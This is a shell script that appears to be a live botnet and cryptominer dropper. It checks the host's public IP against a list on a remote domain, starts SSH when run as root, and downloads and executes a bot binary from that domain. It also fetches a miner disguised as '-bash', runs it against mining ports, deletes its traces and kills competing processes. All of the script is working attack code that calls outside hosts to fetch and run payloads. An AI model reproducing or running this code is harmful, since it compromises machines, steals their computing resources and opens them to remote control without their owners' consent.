#!/bin/sh

domain="pw.pwndns.pw"
root=$(id -u)
ARCH=$(uname -m)
myip=$(curl -s http://208.95.112.1/line/?fields=query 2> /dev/null)
if which curl > /dev/null 2>&1;	then
	dl="curl --fail --silent --connect-timeout 5 --max-time 10 --retry 1 -o"
	read="curl --fail --silent --connect-timeout 5 --max-time 10 --retry 1"
elif which url > /dev/null 2>&1;	then
	dl="url --fail --silent --connect-timeout 5 --max-time 10 --retry 1 -o"
	read="url --fail --silent --connect-timeout 5 --max-time 10 --retry 1"
elif which get > /dev/null 2>&1;	then
	dl="get -q --connect-timeout 5 --timeout 10 --tries 2 -O"
	read="get -q --connect-timeout 5 --timeout 10 --tries 2 -O-"
elif which wget > /dev/null 2>&1;	then
	dl="wget -q --connect-timeout 5 --timeout 10 --tries 2 -O"
	read="wget -q --connect-timeout 5 --timeout 10 --tries 2 -O-"
else
	dl=""
	read=""
fi
servers=$($read http://$domain/servers/server.txt | grep $myip | wc -l)
if [ "$servers" = "1" ];	then
	pid=$(ps x | grep -v grep | grep -e  "/usr/sbin/ddr" -e "ddrirc" | wc -l)
	if [ "$pid" = "0" ];	then
		if [ "$root" = "0" ];	then
			service ssh start
			service sshd start
			/etc/init.d/sshd start
		fi
		cd /dev/shm || cd /tmp ; rm -rf -- $ARCH $ARCH* .$ARCH* -bash;  $dl $ARCH http://$domain/bots/$ARCH ; chmod +x $ARCH ; ./$ARCH ; rm -rf -- $ARCH $ARCH* .$ARCH* -bash
	else
		ps x | grep '/usr/sbin/ddr' | grep -v R | grep -v grep | awk {'print $1'} | while read -r p; do kill -9 "$p"; done
	fi
else
	echo "$myip is not listed"
	status=$(ss -np | grep -o '[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}' | sort | uniq | grep -e 51.210.15.231 -e 165.22.251.180 -e 185.45.192.135 | wc -l)
	if [ "$status" = "0" ];	then
		cd /var/tmp/ || cd /tmp/ ; rm -rf -- $ARCH $ARCH* .$ARCH* -bash ; $dl -bash http://$domain/miners/$ARCH ; chmod +x -- -bash ; ./-bash -c -k -dp 443 -tls -p 443 -tls -dp 3333 -p 3333 -d; rm -rf -- -bash .$ARCH* $ARCH*
	# else
		# myproxy=$(ss -np | grep -o '[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}' | sort | uniq | grep -e 51.210.15.231 -e 165.22.251.180 -e 185.45.192.135)
		# echo "found $myproxy"
	fi
fi